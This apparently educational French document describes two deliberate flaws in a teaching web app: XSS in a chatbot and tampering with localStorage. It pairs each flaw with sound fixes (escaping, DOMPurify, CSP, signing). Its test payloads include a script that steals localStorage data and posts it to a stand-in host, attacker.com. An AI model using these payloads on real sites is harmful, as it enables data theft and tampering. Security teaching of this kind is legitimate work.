# 🔒 Documentation de la Faille de Sécurité Pédagogique

## Vue d'ensemble

Cette application contient **deux failles de sécurité intentionnelles** à des fins pédagogiques :
1. **XSS (Cross-Site Scripting)** dans le chatbot
2. **Manipulation de données** via localStorage non sécurisé

**⚠️ IMPORTANT** : Ces failles sont volontaires et contrôlées. Elles ne doivent JAMAIS être reproduites sur un site en production.

---

## 🎯 Faille 1 : XSS (Cross-Site Scripting) dans le Chatbot

### Description

Le chatbot permet l'injection de code JavaScript malveillant car les messages utilisateur ne sont pas correctement échappés avant d'être insérés dans le DOM.

### Fonctionnement technique

**Fichier concerné** : `script.js` - Fonction `formatMessage()`

**Code vulnérable** :
```javascript
function formatMessage(text) {
  return text
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/\n/g, '<br>')
    // ⚠️ PROBLÈME : Les balises <script> ne sont pas filtrées
}
```

**Problème** : La fonction insère directement le texte dans `innerHTML` sans échapper les caractères HTML/JavaScript spéciaux (`<`, `>`, `&`, etc.).

### Comment reproduire la faille

#### Test 1 : Injection basique

1. Ouvrez le chatbot (bouton en bas à droite)
2. Tapez ce message :
   ```html
   <script>alert('XSS ! Les données peuvent être volées !');</script>
   ```
3. Envoyez le message

**Résultat attendu** : Une alerte JavaScript s'affiche, démontrant que du code peut être exécuté.

#### Test 2 : Vol de données

1. Faites d'abord le diagnostic NIRD pour générer des données
2. Dans le chatbot, tapez :
   ```html
   <script>console.log('Données volées:', localStorage.getItem('diagnostic_result'));</script>
   ```
3. Ouvrez la console du navigateur (F12)
4. Envoyez le message

**Résultat attendu** : Les données du diagnostic sont affichées dans la console, démontrant qu'un attaquant peut voler des données.

#### Test 3 : Injection avancée (vol de données + envoi externe)

```html
<script>
  const data = localStorage.getItem('diagnostic_result');
  // En production, un attaquant pourrait envoyer ces données à son serveur
  console.log('Données volées:', data);
  // fetch('https://attacker.com/steal', {method: 'POST', body: data});
</script>
```

### Impact

- **Vol de données** : Un attaquant peut voler toutes les données stockées dans le localStorage
- **Exécution de code arbitraire** : N'importe quel code JavaScript peut être exécuté
- **Usurpation d'identité** : Possibilité de voler des cookies, tokens, etc.
- **Défacement** : Modification de l'apparence du site

### Comment s'en protéger

#### Solution 1 : Échappement HTML

```javascript
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text; // textContent échappe automatiquement
  return div.innerHTML;
}

function formatMessage(text) {
  const escaped = escapeHtml(text); // Échapper d'abord
  return escaped
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/\n/g, '<br>');
}
```

#### Solution 2 : Utiliser textContent au lieu de innerHTML

```javascript
// Au lieu de :
content.innerHTML = formatMessage(text);

// Utiliser :
content.textContent = text; // Plus sûr, mais perd le formatage
```

#### Solution 3 : Bibliothèque de sanitization

Utiliser une bibliothèque comme **DOMPurify** :

```javascript
import DOMPurify from 'dompurify';

function formatMessage(text) {
  const formatted = text
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/\n/g, '<br>');
  
  return DOMPurify.sanitize(formatted); // Nettoie le HTML malveillant
}
```

#### Solution 4 : Content Security Policy (CSP)

Ajouter dans le `<head>` du HTML :

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none';">
```

Cela empêche l'exécution de scripts inline.

---

## 🎯 Faille 2 : Manipulation de Données via localStorage

### Description

Les résultats du diagnostic sont stockés dans le `localStorage` sans validation ni protection, permettant leur modification ou leur vol.

### Fonctionnement technique

**Fichier concerné** : `script.js` - Fonction `calculateDiagnostic()`

**Code vulnérable** :
```javascript
localStorage.setItem('diagnostic_result', JSON.stringify({
  score: totalScore,
  percentage: percentage,
  level: level,
  profile: profile,
  timestamp: new Date().toISOString()
}));
```

**Problèmes** :
1. Aucune validation des données avant stockage
2. Aucun chiffrement
3. Accessible à tous les scripts de la page (y compris ceux injectés via XSS)
4. Pas de vérification d'intégrité

### Comment reproduire la faille

#### Test 1 : Modification des données

1. Faites le diagnostic NIRD
2. Ouvrez la console du navigateur (F12)
3. Exécutez :
   ```javascript
   localStorage.setItem('diagnostic_result', JSON.stringify({
     score: 100,
     percentage: 100,
     level: 'hacked',
     profile: 'Village piraté',
     timestamp: new Date().toISOString()
   }));
   ```
4. Rechargez la page ou relisez les données

**Résultat attendu** : Les données peuvent être modifiées directement.

#### Test 2 : Vol de données via XSS combiné

1. Faites le diagnostic
2. Dans le chatbot, injectez :
   ```html
   <script>
     const stolen = localStorage.getItem('diagnostic_result');
     console.log('Données volées:', stolen);
     // Un attaquant pourrait envoyer à son serveur :
     // fetch('https://attacker.com/steal', {method: 'POST', body: stolen});
   </script>
   ```

**Résultat attendu** : Les données sont accessibles et peuvent être volées.

### Impact

- **Modification de données** : Un attaquant peut falsifier les résultats
- **Vol de données personnelles** : Accès à toutes les données stockées
- **Usurpation** : Possibilité de se faire passer pour un autre utilisateur
- **Manipulation de l'application** : Modification du comportement de l'app

### Comment s'en protéger

#### Solution 1 : Ne pas stocker de données sensibles

```javascript
// Ne jamais stocker :
// - Données personnelles
// - Tokens d'authentification
// - Mots de passe
// - Informations financières
```

#### Solution 2 : Validation et signature

```javascript
// Ajouter une signature pour vérifier l'intégrité
function saveDiagnostic(data) {
  const signature = generateSignature(data); // HMAC, par exemple
  const payload = {
    data: data,
    signature: signature,
    timestamp: Date.now()
  };
  localStorage.setItem('diagnostic_result', JSON.stringify(payload));
}

function loadDiagnostic() {
  const stored = localStorage.getItem('diagnostic_result');
  if (!stored) return null;
  
  const payload = JSON.parse(stored);
  if (!verifySignature(payload.data, payload.signature)) {
    console.error('Données corrompues !');
    return null;
  }
  return payload.data;
}
```

#### Solution 3 : Chiffrement

```javascript
// Chiffrer les données sensibles
import CryptoJS from 'crypto-js';

function saveDiagnostic(data) {
  const encrypted = CryptoJS.AES.encrypt(
    JSON.stringify(data),
    'secret-key' // En production, utiliser une clé sécurisée
  ).toString();
  localStorage.setItem('diagnostic_result', encrypted);
}

function loadDiagnostic() {
  const encrypted = localStorage.getItem('diagnostic_result');
  if (!encrypted) return null;
  
  const decrypted = CryptoJS.AES.decrypt(encrypted, 'secret-key');
  return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
}
```

#### Solution 4 : Utiliser sessionStorage au lieu de localStorage

`sessionStorage` est automatiquement vidé à la fermeture de l'onglet, réduisant le risque.

#### Solution 5 : Validation côté serveur

**Important** : La validation côté client n'est jamais suffisante. Toujours valider et stocker les données côté serveur avec :
- Validation stricte
- Chiffrement
- Authentification
- Autorisation

---

## 🔗 Combinaison des failles

Les deux failles peuvent être combinées pour un impact maximal :

1. **XSS** permet d'injecter du code malveillant
2. Ce code peut **voler les données** du localStorage
3. Les données peuvent être **envoyées à un serveur externe**
4. Les données peuvent être **modifiées** pour manipuler l'application

### Scénario d'attaque complet

```html
<script>
  // 1. Voler les données
  const data = localStorage.getItem('diagnostic_result');
  
  // 2. Envoyer à un serveur malveillant
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({stolen: data, url: window.location.href})
  });
  
  // 3. Modifier les données pour manipuler l'app
  localStorage.setItem('diagnostic_result', JSON.stringify({
    score: 0,
    level: 'compromised',
    profile: 'Village compromis'
  }));
  
  // 4. Rediriger vers une page malveillante
  // window.location.href = 'https://attacker.com/phishing';
</script>
```

---

## 📚 Ressources pour aller plus loin

### Documentation officielle

- **OWASP Top 10** : https://owasp.org/www-project-top-ten/
- **OWASP XSS Prevention Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **MDN - Content Security Policy** : https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **MDN - Web Security** : https://developer.mozilla.org/en-US/docs/Web/Security

### Outils de test

- **OWASP ZAP** : Scanner de vulnérabilités web
- **Burp Suite** : Outil de test de sécurité
- **Browser DevTools** : Pour tester les failles XSS

### Bonnes pratiques

- **OWASP Secure Coding Practices** : https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/
- **CWE Top 25** : Liste des failles les plus dangereuses
- **SANS Secure Coding** : Guide de développement sécurisé

---

## ✅ Checklist de sécurité

Avant de mettre un site en production, vérifier :

- [ ] Toutes les entrées utilisateur sont échappées
- [ ] Aucune donnée sensible dans localStorage
- [ ] Validation côté serveur pour toutes les données
- [ ] Content Security Policy configurée
- [ ] HTTPS activé
- [ ] Authentification et autorisation en place
- [ ] Logs de sécurité activés
- [ ] Tests de sécurité effectués
- [ ] Mise à jour régulière des dépendances
- [ ] Documentation de sécurité à jour

---

## 🎓 Conclusion pédagogique

Cette démonstration montre l'importance de :

1. **Ne jamais faire confiance aux données utilisateur** : Toujours valider et échapper
2. **Sécuriser le stockage** : Ne pas stocker de données sensibles côté client
3. **Défense en profondeur** : Plusieurs couches de protection
4. **Tests de sécurité** : Tester régulièrement les failles connues
5. **Formation continue** : Se tenir informé des nouvelles menaces

En comprenant comment ces failles fonctionnent, vous serez mieux armé·e pour les éviter dans vos propres projets.

---

**⚠️ Rappel** : Cette faille est intentionnelle et pédagogique. Ne jamais reproduire sur un site en production !

**Licence** : Ce document est sous licence CC BY-SA 4.0, comme le reste du projet.

